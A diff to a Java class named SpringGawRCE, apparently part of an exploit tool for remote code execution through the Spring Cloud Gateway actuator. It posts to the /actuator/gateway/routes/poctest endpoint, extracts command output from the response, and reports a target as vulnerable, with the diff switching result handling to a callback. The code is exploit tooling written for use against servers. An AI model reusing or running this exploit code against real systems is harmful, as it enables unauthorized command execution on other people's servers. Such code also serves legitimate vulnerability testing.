@@ -1,6 +1,7 @@
 package src.main.module;
 
 import src.main.common.UA_Config;
+import src.main.impl.ResultCallback;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -66,12 +67,12 @@ public class SpringGawRCE {
         this.address = address;
     }
 
-    public Stream<String> GawExp() throws IOException{
-        Stream.Builder<String> builder = Stream.builder();
+    public void GawExp(ResultCallback callback) throws IOException{
         String api = "";
         String data = "";
         String res = "";
         String ua = "";
+        String text = "";
         if (command == null) {
             api = "/actuator/gateway/routes/poctest";
             data = pocData;
@@ -121,6 +122,7 @@ public class SpringGawRCE {
                         content.append(inputLine);
                         res = inputLine.toString();
                     }
+                    in.close();
                     int responseCode2 = conn2.getResponseCode();
                     if (responseCode2 == HttpURLConnection.HTTP_OK) {
                         if (!res.contains("poctest")) {
@@ -128,21 +130,29 @@ public class SpringGawRCE {
                             Pattern pattern = Pattern.compile(resultPattern);
                             Matcher matcher = pattern.matcher(content.toString());
                             if (matcher.find()) {
-                                String result = "当前命令回显:\n" + matcher.group(1).replace("\\n", "\n");
-                                builder.add(result);
+                                text = "当前命令回显:\n" + matcher.group(1).replace("\\n", "\n");
+                                callback.onResult(text);
                             }
                         } else {
-                            builder.add(address + " " + "存在RCE漏洞!");
+                            text = address + " " + "存在RCE漏洞!";
+                            callback.onResult(text);
                         }
                     } else {
-                        builder.add("POST request failed with response code: " + responseCode1);
+                        text = "POST request failed with response code: " + responseCode1;
+                        callback.onResult(text);
                     }
-                    in.close();
+                } else{
+                    text = "POST request failed with response code: " + responseCode1;
+                    callback.onResult(text);
                 }
+            }else{
+                text = "无法创建路由";
+                callback.onResult(text);
             }
         }catch (Exception e){
+            text = "发起请求异常";
+            callback.onResult(text);
             e.printStackTrace();
         }
-        return builder.build();
     }
 }
